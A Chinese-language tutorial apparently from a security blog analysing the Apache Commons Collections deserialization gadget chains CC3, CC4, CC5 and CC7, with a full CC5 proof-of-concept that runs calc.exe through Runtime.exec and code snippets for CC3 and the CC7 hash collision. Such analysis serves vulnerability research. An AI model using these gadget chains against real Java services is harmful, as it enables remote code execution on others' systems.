0x01 CommonsCollections3


这条链依然是LazyMap的触发方式，但不同的是弹计算器的方法，CC1是用的反射机制，加载Runtime然后invoke任意方法，进而执行命令，有点PHP命令执行的味道，但CC3则用到了类加载机制，加载恶意字节码进而执行命令，就有点像代码执行了，因为是基于CC1的改造，所以在jdk版本上同样受限制


关于加载恶意字节码进行RCE可以看一下我这篇文章，本质上就是将CC1中Runtime替换为了TemplatesImpl链


CC3的关键类就是com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter，可以看到在它的构造方法中，动态调用了newTransformer()

还记得CC1我们怎么让Runtime执行的么？就是用的InvokerTransformer#transform()去反射加载的，那么有没有一个类，它实现了transform()方法，代码逻辑中动态调用了getConstructor()，并且最终调用了newInstance()呢？


答案肯定是有的，就是InstantiateTransformer#transform()



同时最关键的两个属性都在它的构造方法中



好巧不巧构造方法是一个public，最终构造Demo的时候需要注意几点

  • InstantiateTransformer#InstantiateTransformer()

    • 第一个参数为目标构造方法参数的类型

    • 第二个参数为目标构造方法的参数

  • InstantiateTransformer#transform()

    • 就一个参数，你要调用谁的构造方法


Demo：

new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}).transform(TrAXFilter.class);

0x02 CommonsCollections4


CC4这条链是针对commons-collections4-4.0这个版本的，挖掘思路还是一样，看看那个类下的方法动态调用了transform()，然后追踪那个类的方法，看看谁动态调用了他或者再readObject中动态调用了它，如果你自己尝试着复现一遍挖掘过程，其实就能知道是怎么回事儿了



我们来看这个关键方法TransformingComparator#compare()



符合动态调用transform()的条件，this.transformer也是直接在它的构造方法中

0x04 CommonsCollections5


还记得CommonsCollections1么？CC5跟它的区别就是，CC1的入口点是HashMap#readObject()->hash()，而CC5仅仅更换了入口点为BadAttributeValueExpException#readObject()->TiedMapEntry.toString()


还有一点不同的是需要反射修改var属性，这是为了能够使varObj的值为TiedMapEntry类型，从而顺利调用TiedMapEntry.toString()



Poc：

package Ser;
import Util.toSerialize;import Util.toUnSerialize;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.NOPTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;
public class CC5{    public static void main(String[] args) throws Exception{        // 构造 chainedTransformer 调用链, 解决 Runtime 的序列化问题        Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{                new ConstantTransformer(Runtime.class),                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class} ,new Object[]{"getRuntime",new Class[0]}),                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),                new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"})        });        // 实例化 LazyMap, 给一个没用的 NOPTransformer 是为了别在put时触发RCE        Map lazyMap=  LazyMap.decorate(new HashMap(), NOPTransformer.getInstance());        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,1);        // 将构造好的 tiedMapEntry 放到key上, 便于触发 key.hashCode()        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);        // 反射修改var        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");        val.setAccessible(true);        val.set(badAttributeValueExpException, tiedMapEntry);        // 反射修改真正的 factory        Field factory = LazyMap.class.getDeclaredField("factory");        factory.setAccessible(true);        factory.set(lazyMap,chainedTransformer);        // 移除 key 为了能够触发 if条件 中的 factory.transform(key)        lazyMap.remove(1);        // 序列化与反序列化        new toSerialize(badAttributeValueExpException);        new toUnSerialize("poc.ser");    }}

0x06 CommonsCollections7


CC7用到的是HashTable#readObject()，首先在readObject()中是可以间接利用CC6的，这里的key我们可以控制



但是作者肯定不会那么无聊，明明可以更方便，却来个麻烦的（实则确实麻烦），这里的关键技术就是Hash碰撞，这跟PHP的碰撞还是非常像的，比如下图两个值不同的字符串，哈希却是一样的



这也是得益于String中hashCode()的算法



为什么说它是关键点，我们这次先上比较不好理解代码

Map map1 = new HashMap();Map map2 = new HashMap();Map lazyMap1 = LazyMap.decorate(map1, TransformerChain);lazyMap1.put("cc", 2);Map lazyMap2 = LazyMap.decorate(map2, TransformerChain);lazyMap2.put("dD", 2);Hashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 2);hashtable.put(lazyMap2, 2);lazyMap2.remove("cc");


大概有三个疑点：

  • 为什么是两个LazyMap？

  • 为什么要传“cc”、“dD”？

  • 为什么只remove cc？


一个一个来，先看看为什么是两个LazyMap，来到Hashtable#reconstitutionPut()，因为我们将LazyMap put到了Hashtable的key上，所以这里就会进入LM的方法



但是LM并未实现这个方法，所以就跑到它的父类AbstractMapDecorator#hashCode()中了，这时候map的类型变为了我们之前put给LM的HM




‍第一个hash就是这么计算的



其实就等价于



接着又拿算出来的hash跟0x7FFFFFFF进行按位与然后除以3，我不懂算法，不太清楚这么做是为了什么...但0x7FFFFFFF是int型的临界值，按位与就是先将数据转为二进制然后按位进与运算，真真的真，真假得假（狗头）



然后程序迭代tab[index]，此时tab为空



继续往下，tab经过Entry处理，第三个元素变为了我们put的第一个LM



来到第二次readObject（因为之前put了两个LM，所以会遍历），算法还是上面的算法，不同的是，因为我们之前成功的让tab的第三位有了值，又因为“cc”与“dD”的hash相同，所以这次e成功去到了tab下的第三个值



就成功来到了AbstractMap#equals()



因为LM未实现size()方法，所以跑到父类的size()中，拿到size后绕过if，又因为之前的赋值，所以m.get(key)之前的条件都是满足的



成功衔接上LazyMap链，真的牛*，到这里第一、二个问题相信大家已经明白一二了



我们继续，第二个问题，为什么要remove "cc"？这已经很清楚了



简单总结一下三个问题：

  • 第一是为了能够进入reconstitutionPut()的for循环进而调用equals()

  • 第二是为了第一

  • 第三是CC6的老毛病，避免因为有key而无法调用transform()


挖这条链的人确实6，这么复杂的调用关系都能整出来
